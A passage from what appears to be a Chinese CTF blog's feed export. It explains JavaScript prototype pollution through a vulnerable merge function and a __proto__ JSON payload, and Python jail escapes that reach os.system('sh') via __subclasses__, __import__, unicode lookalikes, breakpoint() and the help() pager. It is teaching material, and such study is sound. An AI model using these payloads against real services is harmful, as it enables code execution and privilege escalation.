class="keyword">prototype</span></span>.<span class="property">name</span> = <span class="string">&#x27;wang&#x27;</span>; <span class="comment">//赋值</span></span><br><span class="line">b = <span class="keyword">new</span> <span class="title function_">a</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(web.<span class="property">name</span>);<span class="comment">//调用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//object方式</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">a.<span class="property">name</span> = <span class="string">&#x27;pan&#x27;</span>;</span><br><span class="line">a.<span class="property">age</span> = <span class="number">19</span>;</span><br></pre></td></tr></table></figure></div><h2 id="js继承机制"><a class="markdownIt-Anchor" href="#js继承机制">#</a> JS 继承机制</h2><p>JS 没有 java 中的 class，它通过 <code>prototype</code>  实现继承</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Dog</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Dog</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">bark</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> dogA = <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&quot;Rover&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> dogB = <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&quot;Fido&quot;</span>);</span><br><span class="line">dogA.<span class="title function_">bark</span>(); <span class="comment">// Rover</span></span><br><span class="line">dogB.<span class="title function_">bark</span>(); <span class="comment">// Fido</span></span><br></pre></td></tr></table></figure></div><h3 id="万物皆对象proto"><a class="markdownIt-Anchor" href="#万物皆对象proto">#</a> 万物皆对象 &amp; proto</h3><p>在 js 中所有的东西都可看为对象。</p><p>而在 js 中每一个对象都会有一个 <code>__proto__</code> 的属性。</p><blockquote><p><code>__proto__</code> <br>对象可以通过 <code>__proto__</code> 来找到其自己的父类。</p></blockquote><p>而对于构造函数也有一个<strong> prototype</strong> 与之相对应。</p><blockquote><p><code>prototype</code> <br> 构造函数 <code>prototype</code>  也是一个对象，为构造函数的原型对象</p></blockquote><h3 id="constructor-构造函数"><a class="markdownIt-Anchor" href="#constructor-构造函数">#</a> constructor 构造函数</h3><p>在 JS 中，每个函数对象还有一个特殊的属性叫做 <code>constructor</code> 。这个属性指向创建该对象的构造函数。当我们创建一个函数时，JS 会自动为该函数创建一个 <code>prototype</code>  对象，并且这个 <code>prototype</code>  对象包含一个指向该函数本身的 <code>constructor</code>  属性。</p><p>当我们使用构造函数创建实例对象时，这些实例对象会继承构造函数的 <code>prototype</code>  对象，从而形成原型链。因此，通过 <code>constructor</code>  属性，实例对象就可以访问到创建它们的构造函数。</p><p>直接把 <code>constructor</code>  当作反向 <code>prototype</code>  理解即可。以刚才的代码举例：</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Dog</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> === <span class="title class_">Dog</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure></div><h2 id="原型链"><a class="markdownIt-Anchor" href="#原型链">#</a> 原型链</h2><p>通俗来讲就是 js 中类之间因继承机制而产生的线性关系。</p><h3 id="污染"><a class="markdownIt-Anchor" href="#污染">#</a> 污染</h3><p>原理很简单，就是 JS 基于原型链实现的继承机制。如果我们能控制某个对象的原型，那我们就可以控制所有基于该原型创建的对象。</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// foo是一个简单的JavaScript对象</span></span><br><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// foo.bar 此时为1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改foo的原型（即Object）</span></span><br><span class="line">foo.<span class="property">__proto__</span>.<span class="property">bar</span> = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于查找顺序的原因，foo.bar仍然是1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时再用Object创建一个空的zoo对象</span></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看zoo.bar</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(zoo.<span class="property">bar</span>)</span><br></pre></td></tr></table></figure></div><p>最后，虽然 zoo 是一个<strong>空</strong>对象 <code>&#123;&#125;</code> ，但 <code>zoo.bar</code>  的结果居然是 2：</p><p>原因也显而易见：因为前面我们修改了 foo 的原型 <code>foo.__proto__.bar = 2</code> ，而 foo 是一个 Object 类的实例，所以实际上是修改了 Object 这个类，给这个类增加了一个属性 bar，值为 2。</p><p>后来，我们又用 Object 类创建了一个 zoo 对象 <code>let zoo = &#123;&#125;</code> ，zoo 对象自然也有一个 bar 属性了。</p><p>那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p><p>以下是一个简单的示范案例：</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个空对象 userA</span></span><br><span class="line"><span class="keyword">let</span> userA = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 给 userA 添加一个属性 isAdmin</span></span><br><span class="line">userA.<span class="property">isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(userA.<span class="property">isAdmin</span>); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 现在我们想让所有用户都有这个属性，我们可以使用原型</span></span><br><span class="line">userA.<span class="property">__proto__</span>.<span class="property">isAdmin</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(userA.<span class="property">isAdmin</span>); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 现在我们创建一个新用户 userB</span></span><br><span class="line"><span class="keyword">let</span> userB = &#123;&#125;;</span><br><span class="line"><span class="comment">// userB 会继承 userA 的 isAdmin 属性</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(userB.<span class="property">isAdmin</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure></div><p>在 CTF 中，往往都是去找一些能够控制对象键名的操作，比如 <code>merge</code> 、 <code>clone</code>  等，这其中 <code>merge</code>  又是最常见的可操纵键名操作。最普通的 <code>merge</code>  函数如下：</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">      <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">          <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          target[key] = source[key]</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>此时，我们运行以下代码，以 JSON 格式创建 <code>o2</code> ，在与 <code>o1</code>  合并的过程中，经过赋值操作 <code>target[key] = source[key]</code> ，实现了一个基本的原型链污染，被污染的对象是 <code>Object.prototype</code> ：</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">merge</span>(o1, o2); <span class="comment">// 1 2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>, o1.<span class="property">b</span>);</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>); <span class="comment">// 2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>); <span class="comment">// [Object: null prototype] &#123; b: 2 &#125;</span></span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;js混淆与反混淆&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#js混淆与反混淆&quot;&gt;#&lt;/a&gt; JS 混淆与反混淆&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;JavaScript&lt;/code&gt;  混淆 &lt;code&gt;（Obfuscation）&lt;/cod</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>PyJail</title>
    <link href="http://example.com/2024/05/06/PyJail/"/>
    <id>http://example.com/2024/05/06/PyJail/</id>
    <published>2024-05-06T14:42:33.000Z</published>
    <updated>2024-05-13T14:15:45.421Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pyjail"><a class="markdownIt-Anchor" href="#pyjail">#</a> PyJail</h1><h2 id="python的一些特性"><a class="markdownIt-Anchor" href="#python的一些特性">#</a> Python 的一些特性</h2><h3 id="object类的继承"><a class="markdownIt-Anchor" href="#object类的继承">#</a> object 类的继承</h3><p><code>Python3.x</code>  版本中，类默认会继承 <code>object</code></p><p>但在 <code>Python2.x</code>  中，默认不会继承</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    不带object</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    name = <span class="string">&quot;zhengtong&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    带有object</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    name = <span class="string">&quot;chonghong&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    x = Person()</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Person&quot;</span>, <span class="built_in">dir</span>(x)</span><br><span class="line"> </span><br><span class="line">    y = Animal()</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Animal&quot;</span>, <span class="built_in">dir</span>(y)</span><br></pre></td></tr></table></figure></div><p>运行结果：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Person [&#x27;__doc__&#x27;, &#x27;__module__&#x27;, &#x27;name&#x27;]</span><br><span class="line">Animal [&#x27;__class__&#x27;, &#x27;__delattr__&#x27;, &#x27;__dict__&#x27;, &#x27;__doc__&#x27;, &#x27;__format__&#x27;, &#x27;__getattribute__&#x27;, </span><br><span class="line">&#x27;__hash__&#x27;, &#x27;__init__&#x27;, &#x27;__module__&#x27;, &#x27;__new__&#x27;, &#x27;__reduce__&#x27;, &#x27;__reduce_ex__&#x27;, &#x27;__repr__&#x27;, </span><br><span class="line">&#x27;__setattr__&#x27;, &#x27;__sizeof__&#x27;, &#x27;__str__&#x27;, &#x27;__subclasshook__&#x27;, &#x27;__weakref__&#x27;, &#x27;name&#x27;]</span><br></pre></td></tr></table></figure></div><h3 id="python中类本身具有一些静态方法"><a class="markdownIt-Anchor" href="#python中类本身具有一些静态方法">#</a> python 中类本身具有一些静态方法</h3><p>如 <code>bytes.fromhex</code> 、 <code>int.from_bytes</code>  等。对于这些类的实例，也能调用这些静态方法。如 <code>b'1'.fromhex('1234')</code> ，返回 <code>b'\x124'</code> 。（一个特殊的例子是整数常量不支持这样操作，如输入 <code>3.from_bytes</code>  会报错）</p><h3 id="python魔术方法"><a class="markdownIt-Anchor" href="#python魔术方法">#</a> Python 魔术方法</h3><ul><li><p><code>__init__</code> ：构造函数。这个在实例化类的时候就会用到，一般是接受类初始化的参数，并且进行一系列初始化操作。</p></li><li><p><code>__len__</code> ：返回对象的长度。对一个对象 <code>a</code>  使用 <code>len(a)</code>  时，会尝试调用 <code>a.__len__()</code> 。例如要通过继承 <code>torch.utils.data.Dataset</code>  来实现自己的数据集时，就需要实现这个方法；</p></li><li><p><code>__str__</code> ：返回对象的字符串表示。对一个对象 <code>a</code>  使用 <code>str(a)</code>  时，会尝试调用 <code>a.__str__()</code> 。这在我们自己实现一些类，譬如复数、二叉树、有限域、椭圆曲线等时，通过实现该方法，能将对象的内容较好地打印出来。（ <code>print</code>  函数中也会自动调用对象的 <code>__str__</code> 方法）相似地，还有 <code>__int__</code> 魔术方法也用于类型转换，不过较少使用；</p></li><li><p><code>__getitem__</code> ：根据索引返回对象的某个元素。对一个对象 <code>a</code>  使用 <code>a[1]</code>  时，会尝试调用 <code>a.__getitem__(1)</code> 。同样，当我们通过继承 <code>torch.utils.data.Dataset</code>  来实现自己的数据集时，就需要实现这个方法。有 <code>__getitem__</code> ，自然也有对应的 <code>__setitem__</code> ；</p></li><li><p><code>__add__</code> 、 <code>__sub__</code> 、 <code>__mul__</code> 、 <code>__div__</code> 、 <code>__mod__</code> ：算术运算，加减乘除模。如对一个对象 <code>a</code>  使用 <code>a+b</code>  时，会尝试调用 <code>a.__add__(b)</code> 。相应地，对于有些运算，对象需放在后面（第二个操作数）的，则需实现 <code>__radd__</code> 、 <code>__rsub__</code> 、 <code>__rmul__</code> 、 <code>__rdiv__</code> 、 <code>__rmod__</code> ，如椭圆曲线上的点的倍点运算 <code>G -&gt; d * G</code> ，就可以通过实现 <code>__rmul__</code> 来实现。</p></li><li><p><code>__and__</code> ， <code>__or__</code> 、 <code>__xor__</code> ：逻辑运算，和算术运算类似；</p></li><li><p><code>__eq__</code> ， <code>__ne__</code> 、 <code>__lt__</code> 、 <code>__gt__</code> 、 <code>__le__</code> 、 <code>__ge__</code> ：比较运算，和算术运算类似；例如 <code>'贵州' &gt; '广西'</code> ，就会转而调用 <code>'贵州'.__gt__('广西')</code> ；按顺序分别是 <code>==</code> , <code>!=</code> , <code>&lt;</code> , <code>&gt;</code> , <code>&lt;=</code> , <code>&gt;=</code></p></li><li><p><code>__getattr__</code> ：访问一个不存在的属性时触发。如果我们对对象 <code>a</code>  所对应的类实现了该方法，那么在调用未实现的 <code>a.b</code>  时，就会转而调用 <code>a.__getattr__(b)</code> 。这也等价于用函数的方法调用： <code>getattr(a, 'b')</code> 。有 <code>__getattr__</code> ，自然也有对应的 <code>__setattr__</code> ；</p></li><li><p><code>__setattr__</code> ：在对一个属性设置值的时候，会调用到这个函数</p></li><li><p><code>__subclasses__</code> ：返回当前类的所有子类。一般是用在 <code>object</code>  类中，在 <code>object.__subclasses__()</code>  中，我们可以找到 <code>os</code>  模块中的类，然后再找到 <code>os</code> ，并且执行 <code>os.system</code> ，实现 RCE。</p></li><li><p>相对应地，python 的类中也包含着一些魔术属性：</p></li></ul><ul><li><code>__dict__</code> ：可以查看内部所有属性名和属性值组成的字典。譬如下面这段代码：</li></ul><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">KFCCrazyThursday</span>:</span><br><span class="line">    vivo = <span class="number">50</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(KFCCrazyThursday.__dict__)</span><br></pre></td></tr></table></figure></div><p>就能看到字典中包含 <code>'vivo': 50</code>  的键值对。注意在 python 中， <code>dict()</code>  是将类转成字典的函数，跟此魔术属性无关。</p><ul><li><p><code>__doc__</code> ：类的帮助文档。默认类均有帮助文档。对于自定义的类，需要我们自己实现。</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">KFCCrazyThursday</span>:</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    And you broke up for seven years, you still can affect my mood, I still keep our photo, remember your birthday, OK? I have countless times to find your impulse, But still hold back, this message I do not block you, because I am your forever blacklist, but I love you, from the past to the present, a full love of you for eight years, But now I&#x27;m not sad, because I have no idea who wrote this or who this girl is, and I just want to tell you by the way: Today is Crazy Thursday, I want to eat KFC</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    vivo = <span class="number">50</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(KFCCrazyThursday.__doc__)</span><br></pre></td></tr></table></figure></div><p>就会打印上面的文档；</p><ul><li><code>__class__</code> ：返回当前对象所属的类。如 <code>''.__class__</code> 会返回 <code>&lt;class 'str'&gt;</code> 。拿到类之后，就可以通过构造函数生成新的对象，如 <code>''.__class__(4396)</code> ，就等价于 <code>str(4396)</code> ，即 <code>'4396'</code> ；</li><li><code>__base__</code> ：返回当前类的基类。如 <code>str.__base__</code> 会返回 <code>&lt;class 'object'&gt;</code> ；</li></ul></li></ul><h3 id="一些重要的内置函数和变量"><a class="markdownIt-Anchor" href="#一些重要的内置函数和变量">#</a> 一些重要的内置函数和变量：</h3><ul><li><code>dir</code> ：查看对象的所有属性和方法。在我们没有思路的时候，可以通过该函数查看所有可以利用的方法；此外，在题目禁用引号以及小数点时，也可以先用拿到类所有可用方法，再索引到方法名，并且通过 <code>getattr</code>  来拿到目标方法。</li><li><code>chr</code> 、 <code>ord</code> ：字符与 ASCII 码转换函数，能帮我们绕过一些 WAF</li><li><code>globals</code> ：返回所有全局变量的函数；</li><li><code>locals</code> ：返回所有局部变量的函数；</li><li><code>__import__</code> ：载入模块的函数。例如 <code>import os</code>  等价于 <code>os = __import__('os')</code> ；</li><li><code>__name__</code> ：该变量指示当前运行环境位于哪个模块中。如我们 python 一般写的 <code>if __name__ == '__main__':</code> ，就是来判断是否是直接运行该脚本。如果是从另外的地方 import 的该脚本的话，那 <code>__name__</code> 就不为 <code>__main__</code> ，就不会执行之后的代码。更多参考<a class="link" href="https://link.zhihu.com/?target=https%3A//www.geeksforgeeks.org/__name__-a-special-variable-in-python/">这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>；</li><li><code>__builtins__</code> ：包含当前运行环境中默认的所有函数与类。如上面所介绍的所有默认函数，如 <code>str</code> 、 <code>chr</code> 、 <code>ord</code> 、 <code>dict</code> 、 <code>dir</code>  等。在 pyjail 的沙箱中，往往 <code>__builtins__</code> 被置为 <code>None</code> ，因此我们不能利用上述的函数。所以一种思路就是我们可以先通过类的基类和子类拿到 <code>__builtins__</code> ，再 <code>__import__('os').system('sh')</code>  进行 RCE；</li><li><code>__file__</code> ：该变量指示当前运行代码所在路径。如 <code>open(__file__).read()</code>  就是读取当前运行的 python 文件代码。需要注意的是，<strong>该变量仅在运行代码文件时会产生，在运行交互式终端时不会有此变量</strong>；</li><li><code>_</code> ：该变量返回上一次运行的 python 语句结果。需要注意的是，<strong>该变量仅在运行交互式终端时会产生，在运行代码文件时不会有此变量</strong>。</li></ul><h2 id="hnctf-2022-jail"><a class="markdownIt-Anchor" href="#hnctf-2022-jail">#</a> HNCTF 2022 Jail</h2><h3 id="calc_jail_beginner"><a class="markdownIt-Anchor" href="#calc_jail_beginner">#</a> calc_jail_beginner</h3><p>源码</p><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/05/07/krREqKi1.png" alt="1715085559866.png"></p><p>注释写着答案</p><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/05/07/DCydnhAo.png" alt="1715079686139.png"></p><h3 id="calc_jail_beginner_level1"><a class="markdownIt-Anchor" href="#calc_jail_beginner_level1">#</a> calc_jail_beginner_level1</h3><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/05/07/IQ2CmUzY.png" alt="1715085567940.png"></p><p>经过试错可以发现时 <code>flag</code>  字符被过滤了，可以使用 <code>chr()</code>  绕过</p><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/05/07/pZ9UlBeb.png" alt="1715085345824.png"></p><h3 id="calc_jail_beginner_level2"><a class="markdownIt-Anchor" href="#calc_jail_beginner_level2">#</a> calc_jail_beginner_level2</h3><p><img lazyload src="/images/loading.svg" data-src="https://img2.imgtp.com/2024/05/07/8sOZtPla.png" alt="1715085670839.png"></p><p>长度限制 13 个字符</p><p><code>eval(input())</code>  就不会限制长度了</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/07/yH3VnYJMhdu9KDz.png" alt="image.png"></p><h3 id="calc_jail_beginner_level25"><a class="markdownIt-Anchor" href="#calc_jail_beginner_level25">#</a> calc_jail_beginner_level2.5</h3><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/07/qd2CRjgS5LtiFXu.png" alt="image.png"></p><p>试错之后发现 ban 了 <code>eval,input,exec</code></p><p>可以使用 unicode 注入   <code>𝓮val(inp𝓾t())</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/07/N4H5DVwTt1u6MxP.png" alt="image.png"></p><p>也可以用 <code>breakpoint()</code> , 一个调试函数，执行后可以执行一些命令不被绕过</p><h3 id="calc_jail_beginner_level3"><a class="markdownIt-Anchor" href="#calc_jail_beginner_level3">#</a> calc_jail_beginner_level3</h3><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/07/Q2eFRdN1KWETXDx.png" alt="image.png"></p><p>限制只有 7 个字符</p><p>1、输入：help ()，这里字符串长度只有 6，会进入正常调用 eval 函数；</p><p>2、进入 help 交互式，然后输入任意一个模块名获得该模块的帮助文档，如 sys；</p><p>3、在 Linux 中，这里呈现帮助文档时，实际上是调用了系统里的 less 或 more 命令，可以利用这俩个命令执行本地命令的特性来获取一个 shell，继续按 #!，再执行外部命令 sh 即可。</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/07/otudEJ38IMCNkge.png" alt="image.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/07/U39Xhjc4THxE8nl.png" alt="image.png"></p><h3 id="python2-input"><a class="markdownIt-Anchor" href="#python2-input">#</a> python2 input</h3><p>这是一个 python2 的 jail</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/07/Z4FIetBKj6Q7yzR.png" alt="image.png"></p><p>因为上面提到的在 python2 类中默认不继承 object 类，需要构造 <code>import</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/07/jcY48uqdnxaOB7L.png" alt="image.png"></p><h3 id="lake-lake-lake"><a class="markdownIt-Anchor" href="#lake-lake-lake">#</a> lake lake lake</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#it seems have a backdoor</span></span><br><span class="line"><span class="comment">#can u find the key of it and use the backdoor</span></span><br><span class="line"></span><br><span class="line">fake_key_var_in_the_local_but_real_in_the_remote = <span class="string">&quot;[DELETED]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    code = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(code)&gt;<span class="number">9</span>):  </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">print</span>(<span class="string">&quot;you&#x27;re hacker!&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Please enter the admin key&quot;</span>)</span><br><span class="line">    key = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(key == fake_key_var_in_the_local_but_real_in_the_remote):</span><br><span class="line">        code = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Nooo!!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _       _          _       _          _       _        </span></span><br><span class="line"><span class="string"> | |     | |        | |     | |        | |     | |       </span></span><br><span class="line"><span class="string"> | | __ _| | _____  | | __ _| 